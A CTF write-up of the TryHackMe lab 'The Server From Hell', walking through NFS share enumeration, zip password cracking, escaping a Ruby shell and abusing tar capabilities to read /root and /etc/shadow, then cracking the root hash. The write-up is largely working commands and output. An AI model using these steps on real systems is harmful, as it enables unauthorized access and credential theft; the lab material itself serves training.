---
title: "The Server From Hell TryHackMe Write Up"
last_modified_at: 2020-11-03T14:40:02-05:00
categories:
  - thm
author_profile: false
tags:
  - thm
  - Linux
  - linux capabilities
  - hashcat
  - firewall
  - nfs
  - zip2john
  - john
  - password cracking
  - shell escaping
  - tar
---
<script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="reddevil2020" data-description="Support me on Buy me a coffee!" data-message="Thank you for visiting. You can now buy me a coffee!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>


![2](/assets/images/thm/theserverfromhell/2.jpg)

The Server From Hell is an medium rated room in TryHackMe by [DeadPackets](https://tryhackme.com/p/DeadPackets). With the hints from different nmap scans, we found a backup.zip file on a nfs share which was password protected and was cracked using john which had private key for a user hades. The backup also had the hint for the port where SSH was running and we login on the box as user hades.
On the box linux capabilities on the /bin/tar binary was exploited to get a root shell on the box. 

> Task 1 - Hacking the server  
Start at port 1337 and enumerate your way.
Good luck.

# Port 1337

![1](/assets/images/thm/theserverfromhell/1.png)
We get a invalid response. Lets analyse the request in the burp.

## On Burp 
**Request**
```html
GET / HTTP/1.1
Host: 10.10.105.19:1337
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ne;q=0.8
Connection: close
```

**Response**
```html
Welcome traveller, to the beginning of your journey
To begin, find the trollface
Legend says he's hiding in the first 100 ports
Try printing the banners from the ports
```

## Scanning top 100 ports
```console
local@local:~/Documents/tryhackme/theserverfromhell$ nmap -p1-100 10.10.105.19 --script banner -oN top100
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-03 22:00 +0545                       
Nmap scan report for 10.10.105.19                                                       
Host is up (0.33s latency).                                                             
                                                                                        
PORT    STATE SERVICE                                                                   
1/tcp   open  tcpmux                                                                    
| banner: 550 12345 00000000000000000000000000000000000000000000000000000               
|_00                                                                                    
2/tcp   open  compressnet                                                               
| banner: 550 12345 00000000000000000000000000000000000000000000000000000               
|_00                                                                                    
3/tcp   open  compressnet                                                               
| banner: 550 12345 00000000000000000000000000000000000000000000000000000               
|_00                                                                                    
4/tcp   open  unknown                                                                   
| banner: 550 12345 00000000000000000000000000000000000000000000000000000               
|_00                                                                                    
5/tcp   open  rje                                                                       
| banner: 550 12345 00000000000000000000000000000000000000000000000000000   
.....
.....
.....
|_banner: \x8D000\x8D000\x100\x81\x89\x02\x81\x810w\x02\x03\x010\x010
95/tcp  open  supdup
| banner: <boinc_gui_rpc_reply>\x0A<major_version>0/major_version>\x0A<mi
|_nor_version>5/minor_version>\x0A<release>6/release>
96/tcp  open  dixie
| banner: HTTP/1.0 502 Bad Gateway\x0D\x0AProxy-Connection: close\x0D\x0A
|_Content-type: text/html; charset=us-ascii\x0D\x0A\x0D\x0A<html><head...
97/tcp  open  swift-rvf
|_banner: HTTP/1.0 204 j\x0D\x0AServer: ATEN HTTP Server(V46915)
98/tcp  open  linuxconf
|_banner: SIP/2.0 ------
99/tcp  open  metagram
| banner: E000\x83SFATAL0C0A0000Munsupported frontend protocol 3923.19778
|_: server supports 1.0 to 3.00Fpostmaster.c0L25040RProcessStartupPack...
100/tcp open  newacct
|_banner: 220 Personal FTP Server ready

```
Looks like there is firewall in place, which is showing all the ports as open. And another interesting things that I found here is the number 12345 which is repeating quite a lot on the banner. So thinking that as a hint, I connected to that port.

## Port 12345
```console
local@local:~/Documents/tryhackme/theserverfromhell$ nc 10.10.105.19 12345
NFS shares are cool, especially when they are misconfigured
It's on the standard port, no need for another scan
```


# Enumerating nfs
## Listing exports
```console
local@local:~/Documents/tryhackme/theserverfromhell$ showmount -e 10.10.105.19
Export list for 10.10.105.19:
/home/nfs *
```
## Mounting the share
```console
local@local:~/Documents/tryhackme/theserverfromhell$ mkdir mnt
local@local:~/Documents/tryhackme/theserverfromhell$ sudo mount -t nfs 10.10.105.19:/home/nfs mnt/
local@local:~/Documents/tryhackme/theserverfromhell/mnt$ ls
backup.zip
local@local:~/Documents/tryhackme/theserverfromhell/mnt$ cp backup.zip ..
```
## Extracting the zip's content
```console
local@local:~/Documents/tryhackme/theserverfromhell/mnt$ cd ..
local@local:~/Documents/tryhackme/theserverfromhell$ unzip backup.zip 
Archive:  backup.zip
   creating: home/hades/.ssh/
[backup.zip] home/hades/.ssh/id_rsa password:
```
But the zip is password protected. Lets try to crack the zip password using john.

## John to crack zip's password
```console
local@local:~/Documents/tryhackme/theserverfromhell$ locate zip2john
/home/local/Documents/tryhackme/koth/carnage/zip2john
```
I had already downloaded zip2john while playing koth on thm. zip2john is already present on most pentesting distros. If you do not have zip2john on you device, you can download it from github.

## Creating hash using zip2john
```console
local@local:~/Documents/tryhackme/theserverfromhell$ /home/local/Documents/tryhackme/koth/carnage/zip2john backup.zip 2>/dev/null | tee backup.hash 
backup.zip:$pkzip2$3*2*1*0*8*24*1c4c*b16d*7d8849d53ca2d690df91b5f8ff302e0eae9c13c7fbb169b6d935abdfef8c00e339f84c09*1*0*8*24*6f72*b16d*7168a30d9a64dc6df0956c675b62ff980dbd4f16fe022b1abb1c75e1943c97e47bbdc5f5*2*0*16*a*f51a7381*8e5*52*0*16*f51a*b16d*5050fa8c08f92051a2cad9941e8a8f4522a8c5dbfa32*$/pkzip2$::backup.zip:home/hades/.ssh/hint.txt, home/hades/.ssh/authorized_keys, home/hades/.ssh/id_rsa:backup.zip
```
## Cracking the password
```console
local@local:~/Documents/tryhackme/theserverfromhell$ john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
No password hashes left to crack (see FAQ)
local@local:~/Documents/tryhackme/theserverfromhell$ john --show backup.hash 
backup.zip:zxcvbnm::backup.zip:home/hades/.ssh/hint.txt, home/hades/.ssh/authorized_keys, home/hades/.ssh/id_rsa:backup.zip

1 password hash cracked, 0 left
```
Password can be easily cracked with usual rockyou.txt wordlist.

## Extracting the contents of backup.zip
```console
local@local:~/Documents/tryhackme/theserverfromhell$ unzip backup.zip && rm backup.zip 
Archive:  backup.zip
[backup.zip] home/hades/.ssh/id_rsa password: 
  inflating: home/hades/.ssh/id_rsa  
 extracting: home/hades/.ssh/hint.txt  
  inflating: home/hades/.ssh/authorized_keys  
 extracting: home/hades/.ssh/flag.txt  
  inflating: home/hades/.ssh/id_rsa.pub 
  ```
  We get some interesting files. The most interesting file is **id_rsa** which is the private key for user hades.

## Content of flag.txt
  ```console
local@local:~/Documents/tryhackme/theserverfromhell$ cd home/hades/.ssh/
local@local:~/Documents/tryhackme/theserverfromhell/home/hades/.ssh$ ls
authorized_keys  flag.txt  hint.txt  id_rsa  id_rsa.pub
local@local:~/Documents/tryhackme/theserverfromhell/home/hades/.ssh$ cat flag.txt 
thm{h0p3_y0u*****************w4ll}
```
Since we have the private key of user hades, lets try to login using the key.
```console
local@local:~/Documents/tryhackme/theserverfromhell/home/hades/.ssh$ ssh -i id_rsa hades@10.10.105.19
kex_exchange_identification: read: Connection reset by peer
```
But looks like the ssh service is not running on port 22.

## Content of hint.txt
```console
local@local:~/Documents/tryhackme/theserverfromhell/home/hades/.ssh$ cat hint.txt 
2500-4500
```
From the hint, looks like the ssh service is somewhere in between port 2500-4500.

## Port Scan
```console
local@local:~/Documents/tryhackme/theserverfromhell$ nmap -p2500-4500 --script=banner --min-rate 10000 -oN nmap/port2500-45000 10.10.105.19
```
I saved the output on the filename port2500-45000 so that I can manipulate the result easily.

## Finding the port running SSH service
```console
local@local:~/Documents/tryhackme/theserverfromhell$ cat nmap/port2500-45000 | grep -i openssh -B3
2632/tcp open  irdg-post
|_banner: \x01\x01
2633/tcp open  interintelli
|_banner: SSH-1017896-OpenSSH_Vwd .
--
| banner: 0077ERR \x0A  Your Git client has made an invalid request:\x0A 
|_ GET / HTTP/1.0\x0D\x0A\x0D\x0A\x0A  Visit http://support.github.com...
2675/tcp open  ttc-etap
|_banner: SSH-457-OpenSSHrv]+\x0D?
--
| banner: <?xml version="1.0" encoding="ISO-8859-1"?>\x0D\x0A<!DOCTYPE ht
|_ml PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"\x0D\x0A  "http://www.w3...
3333/tcp open  dec-notes
|_banner: SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
--
| banner: +host=cashew version=70109 uptime=0:6917293 audio-bits=8audio-b
|_yte-order=mendian
3353/tcp open  fatpipe
|_banner: SSH-17-OpenSSH_gSYIDLY miniBSD-144243\x0D?
--
| banner: HTTP/1.1 400 Bad Request\x0D\x0AContent-Length: 85\x0D\x0AConte
|_nt-Type: text/plain\x0D\x0A\x0D\x0AThe client sent a plain HTTP requ...
3699/tcp open  kpn-icw
|_banner: SSH-8877935-OpenSSH_cjAs-pwexp0r?
``` 
And from the banner, it looks like SSH is running on port 3333.

## Shell as hades
```console
local@local:~/Documents/tryhackme/theserverfromhell/nfs/home/hades/.ssh$ ssh -i id_rsa hades@10.10.105.19 -p 3333

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
Last login: Tue Nov  3 15:50:21 2020 from 10.6.31.213

 ██░ ██ ▓█████  ██▓     ██▓    
▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
▒██▀▀██░▒███   ▒██░    ▒██░    
░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
░▓█▒░██▓░▒████▒░██████▒░██████▒
 ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
 ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
 ░  ░░ ░   ░     ░ ░     ░ ░   
 ░  ░  ░   ░  ░    ░  ░    ░  ░
                               
 Welcome to hell. We hope you enjoy your stay!
 irb(main):001:0> 
```
This time we log in. But we get a weird shell. Looks like it is running ruby.

### Getting a bash shell
```console
 irb(main):001:0> system('/bin/bash')
hades@hell:~$
```
## Reading User flag
```console
hades@hell:~$ ls -la
total 28
drwxr-xr-x 3 root  root  4096 Sep 15 22:11 .
drwxr-xr-x 6 root  root  4096 Sep 15 22:11 ..
-rw-r--r-- 1 hades hades  220 Sep 15 22:11 .bash_logout
-rw-r--r-- 1 hades hades 3771 Sep 15 22:11 .bashrc
-rw-r--r-- 1 hades hades  807 Sep 15 22:11 .profile
drwx------ 2 hades hades 4096 Sep 15 22:11 .ssh
-rw-r--r-- 1 hades hades   30 Sep 15 22:11 user.txt
hades@hell:~$ cat user.txt 
thm{sh3ll_****************_1337}
```

I ran linpeas.sh to find out the potential privilege escalation vector and one entry of linux capability on /bin/tar caught my eye.
### Linux Capabilities on /bin/tar
```console
hades@hell:~$ getcap /bin/tar
/bin/tar = cap_dac_read_search+ep
```
This capability will help us to bypass file read permission checks and directory read and execute permission checks. It is well explained in [this](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/) article.

## Creating a tar of /root
```console
hades@hell:/tmp$ /bin/tar -cvf root.tar /root/
/bin/tar: Removing leading `/' from member names
/root/
/root/.gnupg/
/root/.gnupg/private-keys-v1.d/
/root/.bashrc
/root/root.txt
/root/.bash_history
/root/.ssh/
/root/.ssh/authorized_keys
/root/.cache/
/root/.cache/motd.legal-displayed
/root/.profile
```
## Extracting the root.tar archive
```console
hades@hell:/tmp$ tar -xvf root.tar 
root/
root/.gnupg/
root/.gnupg/private-keys-v1.d/
root/.bashrc
root/root.txt
root/.bash_history
root/.ssh/
root/.ssh/authorized_keys
root/.cache/
root/.cache/motd.legal-displayed
root/.profile
```

## Reading root flag
```console
hades@hell:/tmp$ cat root/root.txt 
thm{w0w**********10n}
```

## Getting a root shell
```console
hades@hell:/tmp$ /bin/tar -cvf root.tar /etc/shadow                                                                                                                             
/bin/tar: Removing leading `/' from member names                                        
/etc/shadow
hades@hell:/tmp$ tar -xvf root.tar                                                       
etc/shadow
```
### Root hash
```console
hades@hell:/tmp$ cat etc/shadow | grep -i root
root:$6$gOnbjpUs$c0IEFcbrGocU26kyzzPOqzY02e7bcawNexPsEm3oENaBIw7mVz/h9dOgaDaphveFY9ScIetMiI8F/XOnTxJxi1:18520:0:99999:7:::
```
### Cracking hash with hashcat
```console
local@local:~/Documents/tryhackme/theserverfromhell$ hashcat -m 1800 hash /usr/share/wordlists/rockyou.txt 
hashcat (v5.1.0) starting...
                              
$6$gOnbjpUs$c0IEFcbrGocU26kyzzPOqzY02e7bcawNexPsEm3oENaBIw7mVz/h9dOgaDaphveFY9ScIetMiI8F/XOnTxJxi1:trustno1    
```
The hash is successfully cracked and now we can login on the box as root.
```console
hades@hell:/tmp$ su -
Password: 
root@hell:~# id
uid=0(root) gid=0(root) groups=0(root)
```


